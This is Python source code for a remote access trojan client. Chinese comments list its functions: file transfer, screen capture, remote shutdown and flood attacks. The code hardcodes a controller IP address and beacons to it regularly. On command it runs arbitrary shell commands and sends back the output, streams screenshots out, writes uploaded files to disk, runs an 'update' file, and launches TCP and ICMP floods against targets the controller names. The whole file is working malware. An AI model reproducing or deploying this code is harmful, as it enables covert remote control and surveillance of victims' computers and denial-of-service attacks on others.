import json
import os
import socket
import struct
import sys

from PIL import ImageGrab, Image

from Attacker import Attacker
from FileExplorer import FileExplorer

'''
功能:
    1. 文件传输
    2. 聊天
    3. tcp, icmp 洪水攻击
    4. 截屏
    5. 远程关机
'''

import platform
import subprocess
import time
from queue import Queue
from threading import Thread

master_ip = '100.95.220.133'


def restart_program():
    print("正在重启...")
    python = sys.executable
    os.execl(python, python, *sys.argv)


def update(filename):
    print("正在升级")
    os.system(filename)
    exit(0)


def judgelang():
    os = platform.system()  # 获取操作系统的类型
    if os == "Windows":
        lang = "GBK"
    else:
        lang = "UTF-8"
    return lang


class UdpPacket:
    type = ''
    content = ''
    pstPort = ''
    pstIP = ''


def get_host_ip():
    """
    查询本机ip地址
    :return: ip
    """
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((master_ip, 8088))
        ip = s.getsockname()[0]
    finally:
        if s:
            s.close()
    return ip


class TrojanClient:
    def __init__(self, udpPort=8082):
        # configs
        self.udpPort = udpPort
        self.udpRecvPort = udpPort + 1
        self.masterIP = master_ip
        self.masterUdpPort = 8083
        self.masterTcpPort = 8877
        self.ownip = get_host_ip()
        print(self.ownip)
        self.cwd = os.getcwd()
        self.fileExplorer = FileExplorer()

        self.p = None

        self.enableRun = True
        self.realCmdQ = Queue()
        self.commandThread = Thread(target=self.cmdRecv)
        self.commandThread.daemon = True
        self.commandThread.start()

        self.udpSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udpSocket.bind((self.ownip, self.udpPort))

        self.udpRecvSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udpRecvSocket.bind((self.ownip, self.udpRecvPort))

        self.tcpSocket = None

        self.udpQ = Queue()
        self.udpS = Thread(target=self.udpSend, daemon=True)
        self.udpR = Thread(target=self.udpRecv, daemon=True)
        self.udpS.start()
        self.udpR.start()


        self.tcpSQ = Queue()
        self.tcpS = Thread(target=self.RealtcpSend, daemon=True)
        self.tcpS.start()

        self.enablePic = True
        self.picTime = 5  # 每张截图时间间隔为 picTime * 0.05

        self.picThread = None
        self.width = 672

        self.attacker = Attacker()

    def cmdRecv(self):
        while True:
            cmd = self.realCmdQ.get()
            lang = judgelang()
            if lang == "Linux":
                cmd = cmd.encode("UTF-8")
            try:
                thread = Thread(target=self.run_command, args=(cmd, lang))
                thread.start()
            except:
                self.tcpSend("response", "Command Error")

    def tcpPieceSend(self, data, socket, size=1024):
        dsize = 0
        data_len = len(data)
        while dsize + size <= data_len:
            socket.send(data[dsize: dsize + size])
            dsize += size
        if dsize < data_len:
            socket.send(data[dsize:])

    def RealtcpSend(self):
        while True:
            print("正在获取tcp发送包")
            q = self.tcpSQ.get()
            cmd = q['cmd']
            data = q['data']
            print("已取得, 正在发送:", cmd)
            if not self.tcpSocket:
                return
            try:
                self.tcpSocket.send(struct.pack('i', len(cmd.encode("utf8"))))
                self.tcpSocket.send(cmd.encode("utf8"))
                if cmd == "pic":
                    imd = data.tobytes()
                    img_len = len(imd)
                    self.tcpSocket.send(struct.pack('iii', *data.size, img_len))
                    self.tcpPieceSend(imd, self.tcpSocket, 1024)

                elif cmd == "response":
                    self.tcpSocket.send(struct.pack('i', len(data.encode("utf8"))))
                    self.tcpSocket.send(data.encode("utf8"))

                elif cmd == "filelist":
                    self.tcpSocket.send(struct.pack('i', len(data)))
                    self.tcpPieceSend(data, self.tcpSocket, 1024)
            except:
                print("控制端断开")

    def tcpSend(self, cmd, data=None):
        self.tcpSQ.put({
            'cmd': cmd,
            'data': data
        })


    def tcpPieceRecv(self, length, socket, size=1024):
        dsize = 0
        body = b''
        while dsize + size < length:
            piece = socket.recv(size)
            body += piece
            dsize += len(piece)
        body += socket.recv(length - dsize)
        return body

    def saveFiles(self, socket, file_name, size):
        try:
            data = self.tcpPieceRecv(size, socket, 1024)
            with open(file_name, 'wb') as file:
                file.write(data)
                self.tcpSend("response", "传输完成")
        except Exception as e:
            self.tcpSend("response", str(e))
            self.tcpSend("response", "文件上传失败")

    def udpSend(self):
        print("UDP 发送器已启动")
        while True:
            udpPacket = self.udpQ.get()
            print("发送UDP数据包: %s" % udpPacket.content.decode('utf8'))
            if udpPacket.type == 'send':
                self.udpSocket.sendto(udpPacket.content, (self.masterIP, self.masterUdpPort))
            elif udpPacket.type == 'close':
                print("UDP 发送器已停止")
                break

    def udpRecv(self):
        print("udp 接收器已启动")
        while True:
            data, addr = self.udpRecvSocket.recvfrom(1024)
            print("Received from %s:%d  --> %s" % (addr, self.udpPort, data.decode('utf8')))
            allcmd = data.decode('utf8').split(' ')
            cmd = allcmd[0]
            if cmd == 'find':
                udpPacket = UdpPacket()
                udpPacket.type = 'send'
                udpPacket.content = 'find'.encode('utf8')
                self.udpQ.put(udpPacket)
            elif cmd == 'connect':
                self.tcpSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    self.tcpSocket.connect((self.masterIP, self.masterTcpPort))
                except:
                    self.tcpSocket.close()
                    self.tcpSocket = None
            elif cmd == 'disconnect':
                if self.tcpSocket:
                    self.tcpSocket.close()
                    self.tcpSocket = None
            elif cmd == 'tcpFlood':
                # dst_ip  port start end
                self.attacker.allFlood(*allcmd[1:])
            elif cmd == 'icmpFlood':
                self.attacker.icmpAttack(allcmd[1])
            elif cmd == 'floodStop':
                self.attacker.enableStop = True
            elif cmd == 'pic':
                self.enablePic = True
                self.sendPic(disposable=True)
            elif cmd == 'picstart':
                self.enablePic = True
                if not self.picThread:
                    self.picThread = Thread(target=self.sendPic, daemon=True)
                    self.picThread.start()
            elif cmd == "picstop":
                self.enablePic = False
                self.picThread = None
            elif cmd == "set":
                if allcmd[1] == "pictime":
                    self.picTime = int(allcmd[2])
                elif allcmd[1] == "picwidth":
                    self.width = int(allcmd[2])
            elif cmd == 'upload':
                filename = allcmd[1]
                size = int(allcmd[2])
                print(filename)
                self.saveFiles(self.tcpSocket, filename, size)
            elif cmd == "update":
                try:
                    if self.tcpSocket:
                        self.tcpSocket.close()
                    if self.udpSocket:
                        self.udpSocket.close()
                    if self.udpRecvSocket:
                        self.udpRecvSocket.close()
                except Exception as e:
                    print(e)
                update(allcmd[1])
            elif cmd == 'dos':
                if allcmd[1] == 'restart':
                    restart_program()
                    return
                if allcmd[1] == 'terminate':
                    self.enableRun = False
                    continue
                elif allcmd[1] == 'cd':
                    try:
                        os.chdir(allcmd[2])
                    except:
                        print("权限不足")
                    self.cwd = os.getcwd()
                    self.enableRun = True
                    self.realCmdQ.put('echo %s' % self.cwd)
                    self.transportList()
                else:
                    self.enableRun = True
                    self.realCmdQ.put(' '.join(allcmd[1:]))

            elif cmd == "ls":
                self.transportList()

    def transportList(self):
        self.fileExplorer.getList()
        data = json.dumps({'list': self.fileExplorer.list, 'pwd': os.getcwd()})
        self.tcpSend(cmd="filelist", data=data.encode('utf8'))

    def sendPic(self, disposable=False):
        while self.enablePic:
            print("...", end='')
            im = ImageGrab.grab()
            im = im.resize((self.width, int(im.size[1] * self.width / im.size[0])), Image.ANTIALIAS)
            self.tcpSend(cmd='pic', data=im)
            time.sleep(self.picTime * 0.05)
            if disposable:
                break

    def searchMaster(self):
        udpPacket = UdpPacket()
        udpPacket.type = 'send'
        udpPacket.content = 'find'.encode('utf8')
        self.udpQ.put(udpPacket)

    def run_command(self, command, lang):
        command = command.rstrip()
        print("the command is", command)
        try:
            if not self.enableRun:
                if self.p:
                    self.p.terminate()
                    return
            self.p = subprocess.Popen(command, bufsize=48, shell=True, close_fds=True, stdin=subprocess.PIPE,
                                      stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=self.cwd)
            # poll()判断是否执行完毕，执行完毕返回0，未执行完毕返回None
            while self.p.poll() is None and self.enableRun:
                line = self.p.stdout.readline()
                line = line.strip()
                if line:
                    # 将输出的结果实时打印，并且转换编码格式
                    # print('Subprogram output: [{}]'.format(line.decode(lang)))
                    self.tcpSend("response", line.decode(lang))
            # if self.p.returncode == 0:
            #     print('Subprogram success')
            # else:
            #     print('Subprogram failed')

        except Exception as e:
            self.tcpSend("response", str(e))


def main(port=13400):
    i = 0
    while i <= 20:
        port += i
        try:
            trojanServer = TrojanClient(int(port))
            trojanServer.searchMaster()
            while True:
                trojanServer.searchMaster()
                time.sleep(60)
        except:
            print("error")
        finally:
            i += 4


if __name__ == '__main__':
    thread = Thread(target=main)
    thread.start()
    thread.join()
